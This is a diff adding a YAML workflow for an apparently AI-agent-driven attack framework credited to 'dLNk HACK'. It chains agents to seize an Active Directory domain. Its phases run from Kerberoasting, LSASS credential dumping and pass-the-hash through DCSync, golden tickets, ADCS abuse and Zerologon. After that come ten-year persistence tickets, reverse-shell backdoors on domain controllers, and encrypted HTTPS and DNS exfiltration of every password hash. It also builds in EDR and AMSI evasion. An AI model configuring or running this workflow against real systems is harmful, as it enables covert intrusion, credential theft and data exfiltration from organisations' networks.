@@ -1,0 +1,325 @@
+# Active Directory Domain Takeover Workflow
+# Complete AD attack chain from user to Domain Admin
+# Uses 15+ AD-specific agents
+
+name: "Active Directory Domain Takeover"
+description: "Complete AD attack chain - from domain user to Domain Admin"
+version: "1.0.0"
+author: "dLNk HACK"
+target_type: "windows_domain"
+estimated_duration: 90  # minutes
+success_rate: 0.80
+
+config:
+  stealth_mode: true
+  max_retries: 3
+  timeout_per_phase: 1800
+  enable_evasion: true
+  enable_adaptive_planning: true
+
+requirements:
+  domain: required
+  initial_credentials: required  # domain\user:password or NTLM hash
+  dc_ip: required
+
+phases:
+  # ============================================================================
+  # PHASE 1: AD ENUMERATION
+  # ============================================================================
+  - name: "ad_enumeration"
+    description: "Enumerate Active Directory structure"
+    
+    agents:
+      - name: "BloodHoundAgent"
+        config:
+          collection_method: "All"
+          zip_output: true
+          analyze_paths: true
+        outputs:
+          - bloodhound_data
+          - attack_paths
+          - high_value_targets
+      
+      - name: "InternalNetworkMapperAgent"
+        parallel: true
+        config:
+          scan_domain: true
+          identify_dcs: true
+          identify_servers: true
+        outputs:
+          - domain_controllers
+          - member_servers
+          - workstations
+    
+    success_criteria:
+      - "bloodhound_data is not empty"
+      - "domain_controllers is not empty"
+
+  # ============================================================================
+  # PHASE 2: KERBEROS ATTACKS
+  # ============================================================================
+  - name: "kerberos_attacks"
+    description: "Harvest credentials via Kerberos"
+    
+    agents:
+      - name: "KerberoastingAgent"
+        config:
+          request_spns: true
+          crack_hashes: true
+          wordlist: "rockyou.txt"
+        outputs:
+          - service_accounts
+          - cracked_passwords
+      
+      - name: "ASREPRoastingAgent"
+        parallel: true
+        config:
+          enumerate_users: true
+          crack_hashes: true
+        outputs:
+          - asrep_users
+          - asrep_hashes
+          - cracked_asrep
+      
+      - name: "CredentialHarvesterAgent"
+        parallel: true
+        config:
+          harvest_lsass: true
+          harvest_sam: true
+        outputs:
+          - ntlm_hashes
+          - plaintext_passwords
+
+  # ============================================================================
+  # PHASE 3: LATERAL MOVEMENT
+  # ============================================================================
+  - name: "lateral_movement"
+    description: "Move laterally using harvested credentials"
+    condition: "cracked_passwords is not empty OR ntlm_hashes is not empty"
+    
+    agents:
+      - name: "PassTheHashAgent"
+        config:
+          targets: "{member_servers}"
+          hashes: "{ntlm_hashes}"
+          command: "whoami /all"
+        outputs:
+          - pth_success
+          - compromised_hosts
+      
+      - name: "PassTheTicketAgent"
+        parallel: true
+        config:
+          use_cached_tickets: true
+        outputs:
+          - ptt_success
+      
+      - name: "LateralMovementAgent"
+        depends_on: ["PassTheHashAgent"]
+        config:
+          techniques: ["psexec", "wmiexec", "smbexec"]
+          use_credentials: true
+        outputs:
+          - lateral_hosts
+
+  # ============================================================================
+  # PHASE 4: PRIVILEGE ESCALATION TO DA
+  # ============================================================================
+  - name: "privilege_escalation"
+    description: "Escalate to Domain Admin"
+    
+    agents:
+      # DCSync Attack
+      - name: "DCSyncAgent"
+        condition: "compromised_hosts contains domain_controller"
+        config:
+          target_user: "Administrator"
+          dump_all: false
+        outputs:
+          - dcsync_success
+          - domain_admin_hash
+      
+      # Golden Ticket
+      - name: "GoldenTicketAgent"
+        condition: "domain_admin_hash is not empty"
+        config:
+          create_ticket: true
+          target_user: "Administrator"
+        outputs:
+          - golden_ticket
+          - ticket_path
+      
+      # Constrained Delegation
+      - name: "ConstrainedDelegationAgent"
+        parallel: true
+        config:
+          enumerate: true
+          exploit: true
+        outputs:
+          - delegation_success
+      
+      # ADCS Exploitation
+      - name: "ADCSAgent"
+        parallel: true
+        config:
+          enumerate_templates: true
+          exploit_esc1: true
+          exploit_esc8: true
+        outputs:
+          - adcs_success
+          - certificates
+      
+      # Zerologon (if DC vulnerable)
+      - name: "ZerologonAgent"
+        condition: "dc_vulnerable_zerologon == true"
+        config:
+          target_dc: "{domain_controllers[0]}"
+        outputs:
+          - zerologon_success
+      
+      # Enhanced PrivEsc
+      - name: "EnhancedPrivilegeEscalationAgent"
+        config:
+          windows_techniques: true
+          auto_exploit: true
+        outputs:
+          - privesc_success
+    
+    success_criteria:
+      - "dcsync_success == true OR golden_ticket is not empty OR zerologon_success == true"
+
+  # ============================================================================
+  # PHASE 5: DOMAIN ADMIN VALIDATION
+  # ============================================================================
+  - name: "da_validation"
+    description: "Validate Domain Admin access"
+    
+    agents:
+      - name: "PassTheHashAgent"
+        config:
+          targets: ["{domain_controllers}"]
+          hash: "{domain_admin_hash}"
+          command: "net group 'Domain Admins' /domain"
+        outputs:
+          - da_confirmed
+      
+      - name: "PassTheTicketAgent"
+        condition: "golden_ticket is not empty"
+        config:
+          ticket_file: "{ticket_path}"
+          target: "{domain_controllers[0]}"
+        outputs:
+          - ticket_valid
+
+  # ============================================================================
+  # PHASE 6: PERSISTENCE
+  # ============================================================================
+  - name: "persistence"
+    description: "Establish domain-level persistence"
+    condition: "da_confirmed == true"
+    
+    agents:
+      - name: "GoldenTicketAgent"
+        config:
+          create_ticket: true
+          target_user: "krbtgt"
+          lifetime: 10  # years
+        outputs:
+          - persistence_ticket
+      
+      - name: "PersistenceAgent"
+        parallel: true
+        config:
+          mechanisms: ["scheduled_task", "service", "startup"]
+          targets: ["{domain_controllers}"]
+        outputs:
+          - persistence_established
+      
+      - name: "AdvancedBackdoorAgent"
+        parallel: true
+        config:
+          backdoor_types: ["reverse_shell", "persistent"]
+          targets: ["{domain_controllers}", "{member_servers}"]
+        outputs:
+          - backdoors_deployed
+
+  # ============================================================================
+  # PHASE 7: DATA EXFILTRATION
+  # ============================================================================
+  - name: "data_exfiltration"
+    description: "Exfiltrate domain data"
+    
+    agents:
+      - name: "DCSyncAgent"
+        config:
+          dump_all: true
+          output_format: "hashcat"
+        outputs:
+          - all_hashes
+          - ntds_dit
+      
+      - name: "DataHarvesterAgent"
+        parallel: true
+        config:
+          search_shares: true
+          search_sysvol: true
+          search_patterns: ["password", "credential", "secret"]
+        outputs:
+          - sensitive_files
+      
+      - name: "AdvancedDataExfiltrationAgent"
+        depends_on: ["DCSyncAgent", "DataHarvesterAgent"]
+        config:
+          channels: ["https", "dns"]
+          encrypt: true
+        outputs:
+          - exfil_success
+
+  # ============================================================================
+  # PHASE 8: REPORTING
+  # ============================================================================
+  - name: "reporting"
+    description: "Generate attack report"
+    always_run: true
+    
+    agents:
+      - name: "ReportingAgent"
+        config:
+          format: ["html", "json"]
+          include_bloodhound: true
+        outputs:
+          - report_path
+
+# ============================================================================
+# EVASION
+# ============================================================================
+evasion:
+  enabled: true
+  techniques:
+    - name: "EDRDetectionAgent"
+      run_before: "kerberos_attacks"
+      on_detection:
+        - "AMSIBypassAgent"
+        - "UnhookingAgent"
+        - "DirectSyscallAgent"
+    
+    - name: "ObfuscationAgent"
+      apply_to: ["scripts", "payloads"]
+
+success_criteria:
+  minimum_requirements:
+    - "da_confirmed == true"
+    - "persistence_established == true"
+  
+  optimal_requirements:
+    - "da_confirmed == true"
+    - "persistence_established == true"
+    - "exfil_success == true"
+    - "backdoors_deployed == true"
+
+outputs:
+  workspace: "workspace/{domain}/ad_takeover"
+  logs: "logs/ad_takeover_{timestamp}.log"
+  reports: "reports/ad_takeover_{timestamp}.html"
+  loot: "workspace/{domain}/loot"
+
